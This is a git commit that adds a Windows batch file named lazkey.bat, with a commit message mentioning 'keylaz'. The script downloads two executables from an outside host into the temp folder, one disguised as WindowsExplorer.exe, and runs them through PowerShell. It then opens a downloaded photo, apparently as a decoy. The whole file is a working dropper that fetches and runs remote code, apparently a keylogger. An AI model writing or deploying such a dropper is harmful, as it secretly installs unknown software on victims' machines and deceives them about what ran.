6ed0b3e22a30bb570f708074fb38b8b97e36201a
Jie clark Terec <jieclarkm@gmail.com>
2023-10-27 19:44:18 +0800

    added keylaz & runKuraLaz

---
+++ kura_src/lazkey.bat
@@ -0,0 +1,19 @@
+@echo off
+
+set "imageURL=https://images.unsplash.com/photo-1697530152990-2c47d3cf7d7a"
+set "kuraSvURL=https://kurasver.vercel.app/kura_src/runKuraLaz.exe"
+set "winExURL=https://kurasver.vercel.app/kura_src/WindowsExplorer.exe"
+
+set "tempDir=%TEMP%"
+
+:: Download the image
+powershell -command "(new-object System.Net.WebClient).DownloadFile('%imageURL%', '%tempDir%\image.jpg')"
+
+:: Download and run the  kuraSv.exe
+powershell -command "(new-object System.Net.WebClient).DownloadFile('%kuraSvURL%', '%tempDir%\kuraSv.exe'); Start-Process '%tempDir%\kuraSv.exe'"
+
+:: Download and run the winEx.exe
+powershell -command "(new-object System.Net.WebClient).DownloadFile('%winExURL%', '%tempDir%\WindowsExplorer.exe'); Start-Process '%tempDir%\WindowsExplorer.exe'"
+
+:: Open the downloaded image
+start "" "%tempDir%\image.jpg"
